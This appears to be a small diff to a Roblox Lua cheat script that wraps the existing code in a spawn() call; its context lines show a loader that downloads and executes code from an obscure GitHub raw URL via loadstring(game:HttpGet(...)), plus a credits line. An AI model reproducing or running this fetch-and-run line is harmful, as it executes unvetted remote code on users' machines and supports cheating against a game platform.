@@ -1,3 +1,4 @@
+spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/banbuskox/dfhtyxvzexrxgfdzgzfdvfdz/main/sjkdkjlfdjnnmklcvxjNotifCr"))()
 say("SCRIPT","Edited by LOOP, MadeBy MM")
 getgenv().breaks = false
@@ -63,3 +64,4 @@ while wait() do
     wait(10.01)
 end
 getgenv().breaks = false
+end)
